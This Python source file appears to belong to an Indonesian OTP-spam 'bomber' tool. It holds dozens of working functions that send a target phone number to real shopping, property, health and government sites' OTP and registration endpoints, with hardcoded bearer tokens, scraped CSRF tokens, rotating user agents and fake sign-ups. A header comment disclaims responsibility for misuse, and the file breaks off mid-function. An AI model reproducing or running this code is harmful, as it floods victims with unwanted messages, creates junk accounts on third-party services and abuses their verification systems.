#!/usr/bin/env python3
# handlers.py - 100+ OTP + SPAM ALL (FULL)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import urllib.parse
from utils import fmt_08, fmt_plus, fmt_phone_only, get_random_user_agent, get_public_ip

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

# ================================================================
# ===== AUTO TOKEN GENERATOR (DENGAN FALLBACK) =====
# ================================================================

def generate_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def generate_api_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=24))

def generate_secret():
    return ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=32))

def generate_bearer_token():
    return "Bearer " + ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def generate_webhook_url():
    webhook_id = ''.join(random.choices(string.digits, k=18))
    webhook_token = ''.join(random.choices(string.ascii_letters + string.digits, k=68))
    return f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}"

TOKENS = {
    'twilio_sid': 'AC' + ''.join(random.choices(string.hexdigits.upper(), k=32)),
    'twilio_auth': ''.join(random.choices(string.hexdigits.upper(), k=32)),
    'nexmo_key': ''.join(random.choices(string.digits, k=8)),
    'nexmo_secret': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    'telnyx_token': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'plivo_id': 'MA' + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
    'plivo_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'sinch_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'messagebird_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'ringcentral_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'vonage_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'whatsapp_token': 'EA' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'ultramsg_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'waha_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'callmebot_key': ''.join(random.choices(string.digits, k=6)),
    'textbelt_key': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    'discord_webhook': generate_webhook_url(),
}

# ================================================================
# ===== 70+ OTP HANDLERS =====
# ================================================================

def send_pinhome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_08}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_rumah123_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.rumah123.com/api/otp/request-otp"
        payload = {"cancelledRequestId": str(random.randint(100000, 999999)), "ipAddress": "192.168.1.1", "phoneNumber": phone_raw, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_paper_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        payload = {"phone": phone_plus, "method": "whatsapp", "registered_by": "flutter mweb"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bonusbelanja_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        payload = {"phone": phone_08, "name": "User", "agreeTnc": True, "agreeContact": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_duniagames_otp(phone):
    try:
        phone_plus, username = format_nomor(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone_plus, "userName": username}
        headers = {'Content-Type': 'application/json', 'x-device': str(uuid.uuid4()), 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_hijup_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.hijup.com/sign_in"
        payload = [{"phone_number": phone_raw, "store_path": "hijup"}]
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_alodokter_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": phone_08}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bliblitiket_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
        payload = {"action": "REGISTER_OTP", "channel": "WHATS_APP", "recipient": phone_plus, "recaptchaToken": ""}
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'x-request-id': str(uuid.uuid4()), 'x-channel-id': 'MWEB', 'x-entity': 'TIKET'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_matahari_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": phone_08, "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_ohsome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://ohsome.co.id/api/member/user/random_code_check"
        payload = {"country_code": "62", "account": phone_raw, "type_id": 2, "device_id": str(uuid.uuid4()).replace('-', ''), "check_code": str(random.randint(100000,999999)), "image_id": ''.join(random.choices(string.ascii_letters + string.digits, k=20))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'deviceid': str(uuid.uuid4()).replace('-', '')}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_optikmelawai_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
        payload = {"phone": phone_raw, "name": "User", "email": f"user{random.randint(1000,9999)}@gmail.com"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_hollandbakery_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        sess = requests.Session()
        sess.get("https://www.hollandbakery.co.id/login-phone", headers={'User-Agent': get_random_user_agent()}, timeout=10)
        url = "https://www.hollandbakery.co.id/resend-otp-register"
        data = {"phone": phone_raw}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = sess.post(url, headers=headers, data=data, timeout=10)
        return resp
    except:
        return None

def send_maulagi_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.maulagi.id/api/v2/auth/check"
        payload = {"credentials": phone_08}
        headers = {'Content-Type': 'application/json', 'x-ml-key': 'E32VCHXX32', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bunda_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.bundahospital.com/api/v1/auth/otp"
        payload = {"phone": phone_08, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_planetban_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name": "Test", "phone": phone_08, "password": "Test123", "purpose": "register", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

def send_hashmicro_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://website-api.hashmicro.com/api/add/3"
        name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
        data = {'fullname': name, 'phonenumber': phone_08, 'email': f"{name.lower()}@gmail.com", 'companyname': f'PT {name}', 'medium': '55', 'source': '143'}
        headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp
    except:
        return None

def send_tuneup_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': phone_08, 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp
    except:
        return None

def send_internetrakyat_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'x-api-key': '280999!FTTH', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

def send_ultramilk_register(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "password": "Pass123!", "phone_number": phone_08, "portal": "IcownicPatch", "is_consent": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

def send_kaniva_otp(phone, name=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"})
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
        csrf = None
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
        if match:
            csrf = match.group(1)
        else:
            raw = sess.cookies.get("XSRF-TOKEN", "")
            if raw:
                csrf = urllib.parse.unquote(raw)
        if not csrf:
            return None
        otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        headers_otp = {"X-XSRF-TOKEN": csrf, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Origin": "https://daftar.kanivainternationalbali.com", "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp", "User-Agent": get_random_user_agent()}
        payload = {"name": name, "phone": phone_08}
        resp = sess.post(otp_url, json=payload, headers=headers_otp, timeout=15)
        return resp
    except:
        return None

def send_jembatani_otp(phone, name=None, password=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        if password is None:
            password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://jembatani.co.id", "Referer": "https://jembatani.co.id/"}
        reg_payload = {"phone_number": phone_08, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register", json=reg_payload, headers=headers, timeout=15)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
        resend_payload = {"phone_number": phone_08}
        resend_resp = requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json=resend_payload, headers=headers, timeout=15)
        return resend_resp
    except:
        return None

def send_rcx_otp(phone, name=None, email=None):
    try:
        phone_08 = fmt_08(phone)
        if name is None:
            name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        if email is None:
            email = f"{name.lower()}@gmail.com"
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"})
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if reg_get.status_code != 200:
            return None
        token = None
        if "XSRF-TOKEN" in sess.cookies:
            token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
        if not token:
            match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
            if match:
                token = match.group(1)
        if not token:
            return None
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://sso.rcx.co.id", "Referer": "https://sso.rcx.co.id/register", "User-Agent": get_random_user_agent()}
        data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": phone_08}
        resp = sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
        return resp
    except:
        return None

def send_sahabatteknisi_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        payload = {"phone": phone_08}
        headers = {"x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "content-type": "application/json", "origin": "https://www.sahabatteknisi.co.id", "referer": "https://www.sahabatteknisi.co.id/checkout/confirm"}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

def send_auto2000_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
        payload = {"phoneNumber": phone_08, "isCheckOtpLimit": True, "uniqueID": phone_08, "isLogin": False}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_99co_otp(phone):
    try:
        token = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
        phone_plus = fmt_plus(phone)
        url = "https://www.99.co/id/api/biz/messaging/otp-events"
        payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_belirumah_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.belirumah.co/api/otp/request_new"
        payload = {"phone_number": phone_plus}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_fastwork_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_astra_daihatsu_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        sess = requests.Session()
        sess.headers.update({"User-Agent": get_random_user_agent(), "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "X-Requested-With": "XMLHttpRequest"})
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if resp.status_code != 200:
            return None
        csrf = None
        m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
        if not csrf:
            m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
            if m:
                csrf = m.group(1)
        if not csrf:
            csrf = str(uuid.uuid4())
        otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        headers_otp = {"Content-Type": "application/json; charset=UTF-8", "csrftoken": csrf, "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "User-Agent": get_random_user_agent()}
        payload = {"phoneNo": phone_62}
        resp2 = sess.post(otp_url, headers=headers_otp, json=payload, timeout=20)
        return resp2
    except:
        return None

def send_royal_canin_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        session.headers.update({"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://club.royalcanin.id"})
        session.get("https://club.royalcanin.id/sign-up", timeout=10)
        url = "https://club.royalcanin.id/api/get_otp"
        payload = {"params": {"Email": "", "mobile_number": phone_plus, "OTPType": "IM"}}
        resp = session.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def send_watsons_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_08, "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_hrsbre_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        BASE_URL = "https://career.hrs-bre.site"
        SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
        SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
        headers = {"User-Agent": get_random_user_agent(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Origin": "https://career.hrs-bre.site", "Referer": SIGN_UP_PAGE, "Upgrade-Insecure-Requests": "1"}
        session = requests.Session()
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        nik = ''.join(random.choices(string.digits, k=16))
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com"])
        username = ''.join(random.choices(string.ascii_letters, k=8))
        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        body = (f"--{boundary}\r\n" f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n' f"--{boundary}\r\n" f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n' f"--{boundary}--\r\n")
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp
    except:
        return None

def send_erafone_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        payload = {"identifier": phone_plus, "type": "identifier_validation"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_beautyhaul_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        base = "https://www.beautyhaul.com"
        nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
        password = "Testt#12334"
        reg_payload = {"nama_depan": nama_depan, "nama_belakang": nama_belakang, "email": rand_email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": phone_08, "password": password, "konfirmasi_password": password, "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
        session = requests.Session()
        session.headers.update({"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.beautyhaul.com", "Referer": "https://www.beautyhaul.com/account/register"})
        session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
        resp = session.post(f"{base}/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=12)
        return resp
    except:
        return None

def send_hainaya_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        register_url = "https://app.hainaya.id/api/onboarding/register"
        headers_register = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://app.hainaya.id", "Referer": "https://app.hainaya.id/onboard"}
        prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
        mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
        business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
        register_payload = {"business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone_08, "owner_name": "", "owner_phone": phone_08}
        resp = requests.post(register_url, headers=headers_register, json=register_payload, timeout=15)
        if resp.status_code == 201:
            return resp
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            headers_login = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://app.hainaya.id", "Referer": "https://app.hainaya.id/login"}
            login_payload = {"phone_number": phone_08}
            resp_login = requests.post(login_url, headers=headers_login, json=login_payload, timeout=15)
            return resp_login
        return resp
    except:
        return None

def send_minumyukkaka_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        session = requests.Session()
        first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
        email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
        password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        register_url = "https://minumyukkaka.com/services/liquid/Register"
        headers_register = {"x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register"}
        register_data = {"registerModel[first_name]": first_name, "registerModel[last_name]": "", "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[otp]": "", "registerModel[gender]": "", "registerModel[date_of_birth]": "", "registerModel[IsAddressRequired]": "false", "registerModel[address]": "", "registerModel[additional_address]": "", "registerModel[city]": "", "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "", "registerModel[state]": "", "registerModel[password]": password, "registerModel[verify_password]": password, "registerModel[pin]": "", "registerModel[verify_pin]": ""}
        session.post(register_url, headers=headers_register, data=register_data, timeout=15)
        otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
        x_sat = session.cookies.get('x-sat') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
        headers_otp = {"x-sat": x_sat, "x-requested-with": "XMLHttpRequest", "User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register"}
        otp_data = {"destination": phone_08, "otpLength": "6"}
        resp = session.post(otp_url, headers=headers_otp, data=otp_data, timeout=15)
        return resp
    except:
        return None

def send_sidemang_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        email = f"{email_name}{random.randint(100, 999)}@gmail.com"
        url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://sidemang.palembang.go.id", "Referer": "https://sidemang.palembang.go.id/lambidaro/register-otp"}
        payload = {"phoneNumber": phone_08, "email": email}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

def send_lapormasbup_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://lapormasbup.klaten.go.id/api/register"
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
        payload = {"name": name, "email": email, "mobilephone": phone_08, "gender": "Laki-Laki", "warga_birth_date": f"{random.randint(1966,2010)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}", "password": password, "address": "Jl. Test No. " + str(random.randint(1,200))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            return resp
        url2 = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        resp2 = requests.post(url2, json={"mobilephone": phone_08}, headers=headers, timeout=10)
        return resp2
    except:
        return None

def send_ptsp_kemenag_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
        email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
        chars = list(string.ascii_letters + string.digits)
        random.shuffle(chars)
        password = 'Pass' + ''.join(chars[:6]) + '$'
        url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://dev-ptsp.kemenag.go.id", "Referer": "https://dev-ptsp.kemenag.go.id/login"}
        payload = {"nama": name, "wa": phone_08, "email": email, "password": password}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

def send_shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf_token = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
        if csrf_token:
